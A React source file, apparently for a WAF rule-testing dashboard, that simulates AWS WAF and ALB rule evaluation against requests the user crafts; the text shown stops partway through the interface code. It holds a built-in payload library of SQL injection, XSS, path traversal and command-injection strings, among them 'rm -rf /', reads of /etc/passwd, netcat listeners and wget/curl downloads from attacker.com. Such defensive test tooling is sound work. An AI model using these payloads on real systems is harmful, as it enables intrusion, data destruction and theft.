import React, { useState, useMemo, useEffect } from 'react';
import {
    Box,
    Button,
    Container,
    FormControl,
    InputLabel,
    Select,
    MenuItem,
    TextField,
    Typography,
    Stack,
    Divider,
    Paper,
    Switch,
    IconButton,
    FormControlLabel,
    Alert,
    Chip,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    List,
    ListItem,
    ListItemText,
    ListItemIcon,
    Stepper,
    Step,
    StepLabel,
    StepContent,
    Tabs,
    Tab,
    Grid,
    Card,
    CardContent,
    Badge,
    Tooltip,
    Autocomplete,
    Dialog,
    DialogTitle,
    DialogContent,
    DialogActions,
    Table,
    TableBody,
    TableCell,
    TableContainer,
    TableHead,
    TableRow
} from '@mui/material';
import SecurityIcon from '@mui/icons-material/Security';
import BugReportIcon from '@mui/icons-material/BugReport';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import CancelIcon from '@mui/icons-material/Cancel';
import WarningIcon from '@mui/icons-material/Warning';
import InfoIcon from '@mui/icons-material/Info';
import PlayArrowIcon from '@mui/icons-material/PlayArrow';
import StopIcon from '@mui/icons-material/Stop';
import RestartAltIcon from '@mui/icons-material/RestartAlt';
import CloudIcon from '@mui/icons-material/Cloud';
import FileDownloadIcon from '@mui/icons-material/FileDownload';
import FileUploadIcon from '@mui/icons-material/FileUpload';
import { useDataSource } from '../context/DataSourceContext';
import { useAWSCredentials } from '../context/AWSCredentialsContext';
import RuleDetailsPopup from '../components/WAFView/RuleDetailsPopup';
import { useTheme } from '@mui/material/styles';

// Attack Payload Libraries
const ATTACK_PAYLOADS = {
    'SQL Injection': [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--"
    ],
    'XSS (Cross-Site Scripting)': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>"
    ],
    'Command Injection': [
        "; ls -la",
        "| whoami",
        "& dir",
        "`id`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| nc -l 4444",
        "& ping -c 1 attacker.com",
        "`wget http://attacker.com/shell.sh`",
        "$(curl http://attacker.com/backdoor)"
    ],
    'Path Traversal': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
    ],
    'LDAP Injection': [
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "*)(|(objectclass=*))",
        "admin)(&(password=*))",
        "*)(|(cn=*))",
        "*)(|(mail=*))",
        "*)(|(sn=*))"
    ],
    'NoSQL Injection': [
        "' || '1'=='1",
        "' || 1==1",
        "'; return true; var x='",
        "'; return false; var x='",
        "' || this.password == 'admin",
        "' || this.username == 'admin",
        "'; return this.password == 'admin"
    ]
};

// Test IP Addresses by Category
const TEST_IPS = {
    'Common Attack Sources': [
        '192.168.1.100',
        '10.0.0.50',
        '172.16.0.25',
        '203.0.113.1',
        '198.51.100.1'
    ],
    'Known Malicious IPs': [
        '185.220.101.1',
        '185.220.101.2',
        '185.220.101.3',
        '185.220.101.4',
        '185.220.101.5'
    ],
    'Tor Exit Nodes': [
        '176.10.99.200',
        '176.10.99.201',
        '176.10.99.202',
        '176.10.99.203',
        '176.10.99.204'
    ],
    'Cloud Providers': [
        '3.5.140.0', // AWS
        '8.8.8.8',   // Google
        '1.1.1.1',   // Cloudflare
        '208.67.222.222', // OpenDNS
        '9.9.9.9'    // Quad9
    ],
    'Geographic Locations': [
        '8.8.8.8',     // US
        '1.1.1.1',     // US
        '208.67.222.222', // US
        '9.9.9.9',     // US
        '176.10.99.200' // Germany
    ]
};

// Enhanced rule evaluation logic
const evaluateWafRule = (rule, request) => {
    const result = {
        rule: rule,
        matched: false,
        reason: '',
        details: [],
        priority: rule.Priority || 0,
        action: rule.Action ? Object.keys(rule.Action)[0] : 'Unknown',
        evaluationTime: 0,
        riskLevel: 'low'
    };

    const startTime = performance.now();

    try {
        const statement = rule.Statement;
        if (!statement) {
            result.reason = 'No statement found';
            return result;
        }

        // ByteMatchStatement evaluation
        if (statement.ByteMatchStatement) {
            const bms = statement.ByteMatchStatement;
            const searchString = bms.SearchString;
            const fieldToMatch = bms.FieldToMatch;
            
            let valueToCheck = '';
            if (fieldToMatch.UriPath) {
                valueToCheck = request.path;
            } else if (fieldToMatch.QueryString) {
                valueToCheck = request.queryParams;
            } else if (fieldToMatch.SingleHeader) {
                const headerName = fieldToMatch.SingleHeader.Name;
                const header = request.headers.find(h => h.name.toLowerCase() === headerName.toLowerCase());
                valueToCheck = header ? header.value : '';
            } else if (fieldToMatch.Body) {
                valueToCheck = request.body;
            }

            const containsMatch = valueToCheck.includes(searchString);
            const isNegated = bms.TextTransformations?.some(tt => tt.Priority === 1 && tt.Type === 'LOWERCASE');
            
            result.matched = isNegated ? !containsMatch : containsMatch;
            result.reason = `${isNegated ? 'Does not contain' : 'Contains'} "${searchString}" in ${fieldToMatch.UriPath ? 'URI path' : fieldToMatch.QueryString ? 'query string' : fieldToMatch.SingleHeader ? 'header' : 'body'}`;
            result.details.push({
                field: fieldToMatch.UriPath ? 'URI Path' : fieldToMatch.QueryString ? 'Query String' : fieldToMatch.SingleHeader ? 'Header' : 'Body',
                value: valueToCheck,
                searchString: searchString,
                matched: containsMatch
            });

            // Risk assessment
            if (containsMatch && ATTACK_PAYLOADS['SQL Injection'].some(payload => valueToCheck.includes(payload))) {
                result.riskLevel = 'critical';
            } else if (containsMatch && ATTACK_PAYLOADS['XSS (Cross-Site Scripting)'].some(payload => valueToCheck.includes(payload))) {
                result.riskLevel = 'high';
            }
        }

        // SqliMatchStatement evaluation
        else if (statement.SqliMatchStatement) {
            const sms = statement.SqliMatchStatement;
            const fieldToMatch = sms.FieldToMatch;
            let valueToCheck = '';
            if (fieldToMatch.UriPath) {
                valueToCheck = request.path;
            } else if (fieldToMatch.QueryString) {
                valueToCheck = request.queryParams;
            } else if (fieldToMatch.SingleHeader) {
                const headerName = fieldToMatch.SingleHeader.Name;
                const header = request.headers.find(h => h.name.toLowerCase() === headerName.toLowerCase());
                valueToCheck = header ? header.value : '';
            } else if (fieldToMatch.Body) {
                valueToCheck = request.body;
            }
            // Simulate SQLi detection (very basic)
            const matched = ATTACK_PAYLOADS['SQL Injection'].some(payload => valueToCheck.includes(payload));
            result.matched = matched;
            result.reason = matched ? 'Potential SQL Injection detected' : 'No SQLi pattern detected';
            result.details.push({
                field: fieldToMatch.UriPath ? 'URI Path' : fieldToMatch.QueryString ? 'Query String' : fieldToMatch.SingleHeader ? 'Header' : 'Body',
                value: valueToCheck,
                matched
            });
            result.riskLevel = matched ? 'critical' : 'low';
        }

        // XssMatchStatement evaluation
        else if (statement.XssMatchStatement) {
            const xms = statement.XssMatchStatement;
            const fieldToMatch = xms.FieldToMatch;
            let valueToCheck = '';
            if (fieldToMatch.UriPath) {
                valueToCheck = request.path;
            } else if (fieldToMatch.QueryString) {
                valueToCheck = request.queryParams;
            } else if (fieldToMatch.SingleHeader) {
                const headerName = fieldToMatch.SingleHeader.Name;
                const header = request.headers.find(h => h.name.toLowerCase() === headerName.toLowerCase());
                valueToCheck = header ? header.value : '';
            } else if (fieldToMatch.Body) {
                valueToCheck = request.body;
            }
            // Simulate XSS detection (very basic)
            const matched = ATTACK_PAYLOADS['XSS (Cross-Site Scripting)'].some(payload => valueToCheck.includes(payload));
            result.matched = matched;
            result.reason = matched ? 'Potential XSS detected' : 'No XSS pattern detected';
            result.details.push({
                field: fieldToMatch.UriPath ? 'URI Path' : fieldToMatch.QueryString ? 'Query String' : fieldToMatch.SingleHeader ? 'Header' : 'Body',
                value: valueToCheck,
                matched
            });
            result.riskLevel = matched ? 'high' : 'low';
        }

        // SizeConstraintStatement evaluation
        else if (statement.SizeConstraintStatement) {
            const scs = statement.SizeConstraintStatement;
            const fieldToMatch = scs.FieldToMatch;
            let valueToCheck = '';
            if (fieldToMatch.UriPath) {
                valueToCheck = request.path;
            } else if (fieldToMatch.QueryString) {
                valueToCheck = request.queryParams;
            } else if (fieldToMatch.SingleHeader) {
                const headerName = fieldToMatch.SingleHeader.Name;
                const header = request.headers.find(h => h.name.toLowerCase() === headerName.toLowerCase());
                valueToCheck = header ? header.value : '';
            } else if (fieldToMatch.Body) {
                valueToCheck = request.body;
            }
            const size = valueToCheck.length;
            let matched = false;
            switch (scs.ComparisonOperator) {
                case 'EQ': matched = size === scs.Size; break;
                case 'NE': matched = size !== scs.Size; break;
                case 'LT': matched = size < scs.Size; break;
                case 'LE': matched = size <= scs.Size; break;
                case 'GT': matched = size > scs.Size; break;
                case 'GE': matched = size >= scs.Size; break;
                default: break;
            }
            result.matched = matched;
            result.reason = `Size constraint: ${size} ${scs.ComparisonOperator} ${scs.Size}`;
            result.details.push({
                field: fieldToMatch.UriPath ? 'URI Path' : fieldToMatch.QueryString ? 'Query String' : fieldToMatch.SingleHeader ? 'Header' : 'Body',
                value: valueToCheck,
                size,
                matched
            });
        }

        // AND statement
        else if (statement.AndStatement) {
            const statements = statement.AndStatement.Statements || [];
            const subResults = statements.map(sub => evaluateWafRule({ Statement: sub }, request));
            result.matched = subResults.every(r => r.matched);
            result.reason = result.matched ? 'All AND sub-statements matched' : 'One or more AND sub-statements did not match';
            result.details = subResults;
        }

        // OR statement
        else if (statement.OrStatement) {
            const statements = statement.OrStatement.Statements || [];
            const subResults = statements.map(sub => evaluateWafRule({ Statement: sub }, request));
            result.matched = subResults.some(r => r.matched);
            result.reason = result.matched ? 'At least one OR sub-statement matched' : 'No OR sub-statements matched';
            result.details = subResults;
        }

        // NOT statement
        else if (statement.NotStatement) {
            const sub = statement.NotStatement.Statement;
            const subResult = evaluateWafRule({ Statement: sub }, request);
            result.matched = !subResult.matched;
            result.reason = result.matched ? 'NOT sub-statement did not match' : 'NOT sub-statement matched';
            result.details = [subResult];
        }

        // RateBasedStatement evaluation
        else if (statement.RateBasedStatement) {
            const rbs = statement.RateBasedStatement;
            result.matched = true; // Simplified - in real implementation would check rate
            result.reason = `Rate-based rule (${rbs.Limit} requests per ${rbs.AggregateKeyType})`;
            result.details.push({
                field: 'Rate',
                value: 'Rate check would be performed',
                searchString: `${rbs.Limit} per ${rbs.AggregateKeyType}`,
                matched: true
            });
        }

        // GeoMatchStatement evaluation
        else if (statement.GeoMatchStatement) {
            const gms = statement.GeoMatchStatement;
            result.matched = true; // Simplified - would check actual geo location
            result.reason = `Geo-based rule (${gms.CountryCodes.join(', ')})`;
            result.details.push({
                field: 'Country',
                value: 'Geo location would be checked',
                searchString: gms.CountryCodes.join(', '),
                matched: true
            });
        }

        // IPSetReferenceStatement evaluation
        else if (statement.IPSetReferenceStatement) {
            const irs = statement.IPSetReferenceStatement;
            result.matched = true; // Simplified - would check against IP set
            result.reason = `IP set rule (${irs.ARN})`;
            result.details.push({
                field: 'IP Address',
                value: 'IP would be checked against set',
                searchString: irs.ARN,
                matched: true
            });
        }

        // RegexPatternSetReferenceStatement evaluation
        else if (statement.RegexPatternSetReferenceStatement) {
            const rps = statement.RegexPatternSetReferenceStatement;
            result.matched = true; // Simplified - would check regex patterns
            result.reason = `Regex pattern rule (${rps.ARN})`;
            result.details.push({
                field: 'Pattern',
                value: 'Would check against regex patterns',
                searchString: rps.ARN,
                matched: true
            });
        }

        else {
            result.reason = 'Unsupported statement type';
        }

        result.evaluationTime = performance.now() - startTime;

    } catch (error) {
        result.reason = `Error evaluating rule: ${error.message}`;
        result.details.push({
            field: 'Error',
            value: error.message,
            searchString: '',
            matched: false
        });
    }

    return result;
};

const evaluateAlbRule = (rule, request) => {
    const result = {
        rule: rule,
        matched: false,
        reason: '',
        details: [],
        priority: rule.Priority || 0,
        action: rule.Actions ? rule.Actions[0]?.Type || 'Unknown' : 'Unknown',
        evaluationTime: 0,
        riskLevel: 'low'
    };

    const startTime = performance.now();

    try {
        if (!rule.Conditions) {
            result.reason = 'No conditions found';
            return result;
        }

        // Check if all conditions match
        const conditionResults = rule.Conditions.map(condition => {
            if (condition.Field === 'path-pattern') {
                const pathPattern = condition.Values[0];
                const matches = request.path.includes(pathPattern.replace('*', ''));
                return {
                    field: 'Path Pattern',
                    value: request.path,
                    pattern: pathPattern,
                    matched: matches
                };
            } else if (condition.Field === 'host-header') {
                const hostHeader = condition.Values[0];
                const header = request.headers.find(h => h.name.toLowerCase() === 'host');
                const matches = header && header.value.includes(hostHeader);
                return {
                    field: 'Host Header',
                    value: header ? header.value : 'Not found',
                    pattern: hostHeader,
                    matched: matches
                };
            } else if (condition.Field === 'http-header') {
                // HTTP header match
                const headerName = condition.HttpHeaderConfig?.HttpHeaderName || condition.Values[0];
                const headerValue = condition.Values[1] || '';
                const header = request.headers.find(h => h.name.toLowerCase() === headerName.toLowerCase());
                const matches = header && header.value.includes(headerValue);
                return {
                    field: 'HTTP Header',
                    value: header ? header.value : 'Not found',
                    pattern: `${headerName}: ${headerValue}`,
                    matched: matches
                };
            } else if (condition.Field === 'http-request-method') {
                // HTTP method match
                const method = condition.Values[0];
                const matches = request.method.toUpperCase() === method.toUpperCase();
                return {
                    field: 'HTTP Method',
                    value: request.method,
                    pattern: method,
                    matched: matches
                };
            } else if (condition.Field === 'query-string') {
                // Query string match (simple substring)
                const query = condition.Values[0];
                const matches = request.queryParams.includes(query);
                return {
                    field: 'Query String',
                    value: request.queryParams,
                    pattern: query,
                    matched: matches
                };
            } else if (condition.Field === 'source-ip') {
                // Source IP match (X-Forwarded-For header)
                const ip = condition.Values[0];
                const header = request.headers.find(h => h.name.toLowerCase() === 'x-forwarded-for');
                const matches = header && header.value === ip;
                return {
                    field: 'Source IP',
                    value: header ? header.value : 'Not found',
                    pattern: ip,
                    matched: matches
                };
            }
            return {
                field: condition.Field,
                value: 'Not implemented',
                pattern: condition.Values.join(', '),
                matched: false
            };
        });

        result.matched = conditionResults.every(cr => cr.matched);
        result.reason = result.matched ? 'All conditions matched' : 'Some conditions did not match';
        result.details = conditionResults;
        result.evaluationTime = performance.now() - startTime;

    } catch (error) {
        result.reason = `Error evaluating rule: ${error.message}`;
    }

    return result;
};

const TEST_CASES_STORAGE_KEY = 'waf-debugger-test-cases';

const loadTestCasesFromStorage = () => {
    try {
        const data = localStorage.getItem(TEST_CASES_STORAGE_KEY);
        return data ? JSON.parse(data) : [];
    } catch {
        return [];
    }
};

const saveTestCasesToStorage = (testCases) => {
    try {
        localStorage.setItem(TEST_CASES_STORAGE_KEY, JSON.stringify(testCases));
    } catch {}
};

const RequestDebugger = () => {
    const { aclData, albData } = useDataSource();
    const { isAuthenticated, getWAFClient, credentials } = useAWSCredentials();
    const [mode, setMode] = useState('both');
    const [request, setRequest] = useState({
        method: 'GET',
        path: '/admin/login',
        queryParams: 'user=admin&action=login',
        headers: [
            { name: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            { name: 'Host', value: 'example.com' },
            { name: 'Accept', value: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' },
            { name: 'X-Forwarded-For', value: '192.168.1.100' }
        ],
        body: 'username=admin&password=test123'
    });
    const [results, setResults] = useState(null);
    const [currentStep, setCurrentStep] = useState(0);
    const [activeTab, setActiveTab] = useState(0);
    const [isRunning, setIsRunning] = useState(false);
    const [payloadDialogOpen, setPayloadDialogOpen] = useState(false);
    const [ipDialogOpen, setIpDialogOpen] = useState(false);
    const [testCases, setTestCases] = useState(loadTestCasesFromStorage());
    const [popupOpen, setPopupOpen] = useState(false);
    const [selectedRule, setSelectedRule] = useState(null);
    // Add AI summary state
    const [aiSummary, setAiSummary] = useState('');
    const theme = useTheme();

    const aclLoaded = !!aclData;
    const albLoaded = !!albData;

    const wafRules = useMemo(() => aclData?.Rules?.filter(r => r.Statement || r.Action) || [], [aclData]);
    const albRules = useMemo(() => albData?.Rules?.filter(r => r.Conditions || r.Actions) || [], [albData]);

    const combinedRules = useMemo(() => {
        if (mode === 'both') return [...wafRules, ...albRules];
        if (mode === 'waf') return wafRules;
        if (mode === 'alb') return albRules;
        return [];
    }, [mode, wafRules, albRules]);

    const evaluateRules = async () => {
        setIsRunning(true);
        setCurrentStep(0);
        
        let evaluationResults = [];
        
        // If AWS is connected, try to use real WAF evaluation
        if (isAuthenticated && getWAFClient) {
            try {
                evaluationResults = await evaluateWithAWS(request);
            } catch (error) {
                // Fall back to local evaluation
                evaluationResults = combinedRules.map(rule => {
                    if (rule.Statement || rule.Action) {
                        return evaluateWafRule(rule, request);
                    } else {
                        return evaluateAlbRule(rule, request);
                    }
                });
            }
        } else {
            // Use local evaluation
            evaluationResults = combinedRules.map(rule => {
                if (rule.Statement || rule.Action) {
                    return evaluateWafRule(rule, request);
                } else {
                    return evaluateAlbRule(rule, request);
                }
            });
        }

        // Sort by priority (lower number = higher priority)
        evaluationResults.sort((a, b) => a.priority - b.priority);
        
        setResults(evaluationResults);
        setIsRunning(false);
    };

    const evaluateWithAWS = async (request) => {
        const wafClient = getWAFClient();
        if (!wafClient) throw new Error('WAF client not available');

        // For now, we'll simulate AWS evaluation since we need WebACL IDs
        // In a real implementation, you would:
        // 1. List WebACLs in the account
        // 2. Use CheckCapacity or similar API calls
        // 3. Parse the results
        
        // Simulate AWS evaluation for now
        return combinedRules.map(rule => {
            const result = rule.Statement || rule.Action ? 
                evaluateWafRule(rule, request) : 
                evaluateAlbRule(rule, request);
            
            // Mark as AWS evaluated
            result.source = 'aws';
            result.awsAccount = credentials.accountId;
            result.awsRegion = credentials.region;
            
            return result;
        });
    };

    const handleStepThrough = () => {
        if (!results) return;
        
        if (currentStep < results.length) {
            setCurrentStep(prev => prev + 1);
        } else {
            setCurrentStep(0);
        }
    };

    const matchedRules = results?.filter(r => r.matched) || [];
    const blockedRules = matchedRules.filter(r => r.action === 'BLOCK' || r.action === 'DENY');
    const allowedRules = matchedRules.filter(r => r.action === 'ALLOW' || r.action === 'COUNT');

    const addHeader = () => {
        setRequest(prev => ({
            ...prev,
            headers: [...prev.headers, { name: '', value: '' }]
        }));
    };

    const removeHeader = (index) => {
        setRequest(prev => ({
            ...prev,
            headers: prev.headers.filter((_, i) => i !== index)
        }));
    };

    const updateHeader = (index, field, value) => {
        setRequest(prev => ({
            ...prev,
            headers: prev.headers.map((header, i) => 
                i === index ? { ...header, [field]: value } : header
            )
        }));
    };

    const insertPayload = (payload) => {
        setRequest(prev => ({
            ...prev,
            body: payload
        }));
        setPayloadDialogOpen(false);
    };

    const insertIP = (ip) => {
        setRequest(prev => ({
            ...prev,
            headers: prev.headers.map(header => 
                header.name === 'X-Forwarded-For' ? { ...header, value: ip } : header
            )
        }));
        setIpDialogOpen(false);
    };

    const saveTestCase = () => {
        const testCase = {
            id: Date.now(),
            name: `Test Case ${testCases.length + 1}`,
            request: { ...request },
            timestamp: new Date().toISOString()
        };
        const updated = [...testCases, testCase];
        setTestCases(updated);
        saveTestCasesToStorage(updated);
    };

    const loadTestCase = (testCase) => {
        setRequest(testCase.request);
    };

    const handleExportTestCases = () => {
        const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(testCases, null, 2));
        const dlAnchor = document.createElement('a');
        dlAnchor.setAttribute('href', dataStr);
        dlAnchor.setAttribute('download', 'waf-debugger-test-cases.json');
        document.body.appendChild(dlAnchor);
        dlAnchor.click();
        dlAnchor.remove();
    };

    const handleImportTestCases = (event) => {
        const file = event.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                const imported = JSON.parse(e.target.result);
                if (Array.isArray(imported)) {
                    setTestCases(imported);
                    saveTestCasesToStorage(imported);
                }
            } catch {}
        };
        reader.readAsText(file);
    };

    const getRiskLevelColor = (level) => {
        switch (level) {
            case 'critical': return 'error';
            case 'high': return 'warning';
            case 'medium': return 'info';
            default: return 'success';
        }
    };

    // Helper to generate a local summary
    const generateLocalSummary = (results, blockedRules, matchedRules) => {
        if (!results || results.length === 0) return 'No rules were evaluated.';
        if (blockedRules.length > 0) {
            return `Key blocking rule: "${blockedRules[0]?.rule.Name || blockedRules[0]?.rule.name}" (priority ${blockedRules[0]?.priority}). Reason: ${blockedRules[0]?.reason}`;
        } else if (matchedRules.length > 0) {
            const ruleNames = matchedRules.map(r => r.rule.Name || r.rule.name).join(', ');
            return `Matched rules: ${ruleNames}. All matches were allow or count actions. No blocking conditions were triggered.`;
        } else {
            return 'No rules matched. Default action would apply.';
        }
    };

    // Helper to generate AI summary (OpenAI API)
    const generateAISummary = async (results, blockedRules, matchedRules) => {
        if (!import.meta.env.VITE_REACT_APP_OPENAI_API_KEY) return null;
        try {
            // Build concise summary for the AI
            const conciseResults = {
                outcome: blockedRules.length > 0
                    ? `Blocked by rule "${blockedRules[0]?.rule.Name || blockedRules[0]?.rule.name}" (priority ${blockedRules[0]?.priority})`
                    : matchedRules.length > 0
                        ? "Matched rules present, but none would block the request"
                        : "No rules matched; default action applies",
                decisiveRule: blockedRules.length > 0
                    ? {
                        name: blockedRules[0]?.rule.Name || blockedRules[0]?.rule.name,
                        reason: blockedRules[0]?.reason,
                        priority: blockedRules[0]?.priority
                    }
                    : null,
                matchedRules: matchedRules.slice(0, 10).map(r => ({
                    name: r.rule.Name || r.rule.name,
                    action: r.action
                })),
                risk: blockedRules.some(r => r.riskLevel === "critical" || r.riskLevel === "high")
                    ? "High risk detected"
                    : "No high risk detected"
            };
            const prompt = `You are an AWS security manager. Summarize the following WAF/ALB evaluation for a manager. Only use the facts provided below. Do not speculate or invent details.\n\n${JSON.stringify(conciseResults, null, 2)}`;
            const response = await fetch('https://api.openai.com/v1/chat/completions', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${import.meta.env.VITE_REACT_APP_OPENAI_API_KEY}`
                },
                body: JSON.stringify({
                    model: 'gpt-3.5-turbo',
                    messages: [{ role: 'user', content: prompt }],
                    max_tokens: 120,
                    temperature: 0.2
                })
            });
            const data = await response.json();
            return data.choices?.[0]?.message?.content?.trim() || null;
        } catch {
            return null;
        }
    };

    // Update AI summary after evaluation
    useEffect(() => {
        if (!results) return;
        (async () => {
            let summary = null;
            summary = await generateAISummary(results, blockedRules, matchedRules);
            if (!summary) {
                summary = generateLocalSummary(results, blockedRules, matchedRules);
            }
            setAiSummary(summary);
        })();
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [results]);

    return (
        <Container maxWidth="xl" sx={{ py: 4, height: 'auto' }}>
            <Paper sx={{ p: 3, mb: 3, }}>
                <Stack direction="row" spacing={2} alignItems="center" mb={2}>
                    <BugReportIcon color="primary" />
                    <Typography variant="h5">Advanced WAF Request Debugger</Typography>
                    <FormControl size="small">
                        <InputLabel>Mode</InputLabel>
                        <Select value={mode} label="Mode" onChange={e => setMode(e.target.value)}>
                            <MenuItem value="waf" disabled={!aclLoaded}>CDN-WAF</MenuItem>
                            <MenuItem value="alb" disabled={!albLoaded}>WAF-ALB</MenuItem>
                            <MenuItem value="both" disabled={!(aclLoaded || albLoaded)}>Both</MenuItem>
                        </Select>
                    </FormControl>
                    <Chip 
                        label={`ACL: ${wafRules.length} rules`} 
                        color={aclLoaded ? "primary" : "default"} 
                        size="small" 
                    />
                    <Chip 
                        label={`ALB: ${albRules.length} rules`} 
                        color={albLoaded ? "success" : "default"} 
                        size="small" 
                    />
                    {isAuthenticated && (
                        <Chip 
                            label={`AWS: ${credentials?.accountId} (${credentials?.region})`}
                            color="primary"
                            size="small"
                            startIcon={<CloudIcon />}
                        />
                    )}
                    <Button
                        variant="outlined"
                        size="small"
                        onClick={() => setPayloadDialogOpen(true)}
                        startIcon={<SecurityIcon />}
                    >
                        Attack Payloads
                    </Button>
                    <Button
                        variant="outlined"
                        size="small"
                        onClick={() => setIpDialogOpen(true)}
                        startIcon={<CloudIcon />}
                    >
                        Test IPs
                    </Button>
                </Stack>
                <Divider sx={{ mb: 2 }} />
                
                <Grid container spacing={3}>
                    <Grid xs={12} md={6}>
                        <Typography variant="h6" mb={2}>Request Details</Typography>
                        <Stack spacing={2}>
                            <TextField
                                label="Method"
                                value={request.method}
                                onChange={e => setRequest(r => ({ ...r, method: e.target.value }))}
                                select
                                fullWidth
                            >
                                <MenuItem value="GET">GET</MenuItem>
                                <MenuItem value="POST">POST</MenuItem>
                                <MenuItem value="PUT">PUT</MenuItem>
                                <MenuItem value="DELETE">DELETE</MenuItem>
                                <MenuItem value="HEAD">HEAD</MenuItem>
                            </TextField>
                            
                            <TextField
                                label="Path"
                                value={request.path}
                                onChange={e => setRequest(r => ({ ...r, path: e.target.value }))}
                                fullWidth
                                placeholder="/admin/login"
                            />
                            
                            <TextField
                                label="Query Parameters"
                                value={request.queryParams}
                                onChange={e => setRequest(r => ({ ...r, queryParams: e.target.value }))}
                                fullWidth
                                placeholder="user=admin&action=login"
                            />
                            
                            <TextField
                                label="Request Body"
                                value={request.body}
                                onChange={e => setRequest(r => ({ ...r, body: e.target.value }))}
                                fullWidth
                                multiline
                                minRows={3}
                                placeholder="username=admin&password=test123"
                            />
                        </Stack>
                    </Grid>
                    
                    <Grid xs={12} md={6}>
                        <Typography variant="h6" mb={2}>Headers</Typography>
                        <Stack spacing={1}>
                            {request.headers.map((header, index) => (
                                <Box key={index} sx={{ display: 'flex', gap: 1 }}>
                                    <TextField
                                        label="Name"
                                        value={header.name}
                                        onChange={e => updateHeader(index, 'name', e.target.value)}
                                        size="small"
                                        sx={{ flex: 1 }}
                                    />
                                    <TextField
                                        label="Value"
                                        value={header.value}
                                        onChange={e => updateHeader(index, 'value', e.target.value)}
                                        size="small"
                                        sx={{ flex: 1 }}
                                    />
                                    <IconButton 
                                        onClick={() => removeHeader(index)}
                                        size="small"
                                        color="error"
                                    >
                                        <CancelIcon />
                                    </IconButton>
                                </Box>
                            ))}
                            <Button onClick={addHeader} variant="outlined" size="small">
                                Add Header
                            </Button>
                        </Stack>
                    </Grid>
                </Grid>
                
                <Box sx={{ mt: 3, display: 'flex', gap: 2, alignItems: 'center', flexWrap: 'wrap' }}>
                    <Button 
                        variant="contained" 
                        onClick={evaluateRules} 
                        disabled={combinedRules.length === 0 || isRunning}
                        startIcon={<PlayArrowIcon />}
                        sx={{
                            fontWeight: 600,
                            borderRadius: 3,
                            fontSize: '1.1rem',
                            px: 4,
                            py: 1.5,
                            boxShadow: 2,
                            background: 'linear-gradient(45deg, #1976d2, #2e7d32)',
                            color: '#fff',
                            '&:hover': {
                                background: 'linear-gradient(45deg, #1565c0, #1b5e20)',
                                boxShadow: 4,
                                transform: 'translateY(-2px)'
                            }
                        }}
                    >
                        {isRunning ? 'Evaluating...' : 'Test Request'}
                    </Button>
                    <Button
                        variant="outlined"
                        onClick={saveTestCase}
                        size="small"
                        sx={{ borderRadius: 3, fontWeight: 600, fontSize: '1rem', px: 3, py: 1 }}
                    >
                        Save Test Case
                    </Button>
                </Box>

                {/* Test Cases */}
                {testCases.length > 0 && (
                    <Box sx={{ mt: 2 }}>
                        <Typography variant="h6" mb={1}>Saved Test Cases</Typography>
                        <Stack direction="row" spacing={1} flexWrap="wrap">
                            {testCases.map((testCase) => (
                                <Chip
                                    key={testCase.id}
                                    label={testCase.name}
                                    onClick={() => loadTestCase(testCase)}
                                    variant="outlined"
                                    size="small"
                                />
                            ))}
                            <IconButton component="span" onClick={handleExportTestCases} size="small" color="primary">
                                <FileDownloadIcon />
                            </IconButton>
                            <IconButton component="label" size="small" color="primary">
                                <FileUploadIcon />
                                <input type="file" accept="application/json" hidden onChange={handleImportTestCases} />
                            </IconButton>
                        </Stack>
                    </Box>
                )}
            </Paper>

            {/* Attack Payloads Dialog */}
            <Dialog open={payloadDialogOpen} onClose={() => setPayloadDialogOpen(false)} maxWidth="md" fullWidth>
                <DialogTitle>Attack Payload Library</DialogTitle>
                <DialogContent>
                    <Grid container spacing={2}>
                        {Object.entries(ATTACK_PAYLOADS).map(([category, payloads]) => (
                            <Grid xs={12} md={6} key={category}>
                                <Typography variant="h6" gutterBottom>{category}</Typography>
                                <Stack spacing={1}>
                                    {payloads.map((payload, index) => (
                                        <Chip
                                            key={index}
                                            label={payload}
                                            onClick={() => insertPayload(payload)}
                                            variant="outlined"
                                            size="small"
                                            sx={{ cursor: 'pointer' }}
                                        />
                                    ))}
                                </Stack>
                            </Grid>
                        ))}
                    </Grid>
                </DialogContent>
                <DialogActions>
                    <Button onClick={() => setPayloadDialogOpen(false)}>Close</Button>
                </DialogActions>
            </Dialog>

            {/* Test IPs Dialog */}
            <Dialog open={ipDialogOpen} onClose={() => setIpDialogOpen(false)} maxWidth="md" fullWidth>
                <DialogTitle>Test IP Addresses</DialogTitle>
                <DialogContent>
                    <Grid container spacing={2}>
                        {Object.entries(TEST_IPS).map(([category, ips]) => (
                            <Grid xs={12} md={6} key={category}>
                                <Typography variant="h6" gutterBottom>{category}</Typography>
                                <Stack spacing={1}>
                                    {ips.map((ip, index) => (
                                        <Chip
                                            key={index}
                                            label={ip}
                                            onClick={() => insertIP(ip)}
                                            variant="outlined"
                                            size="small"
                                            sx={{ cursor: 'pointer' }}
                                        />
